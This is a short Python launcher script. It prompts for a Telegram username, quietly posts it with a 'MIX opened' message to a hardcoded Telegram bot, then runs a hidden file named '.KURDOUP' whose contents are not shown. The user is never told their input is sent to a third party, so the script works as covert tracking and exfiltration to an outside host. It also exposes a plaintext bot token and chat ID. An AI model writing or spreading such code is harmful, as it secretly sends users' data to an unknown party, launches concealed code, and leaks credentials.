import os
import sys
import requests



fff=input(" Username Telegramt Bnusa?  : ")
ID= '1218274605'
token = '1734447241:AAFCPdb6AGq34a29VMqbzpNwY5reCmBQtSI'
msg=("\n================================\n [ MIX opened !!! ]\n Username : " + fff + "\n================================")
requests.post(f'https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={msg}\n')
os.system("python2 .KURDOUP")
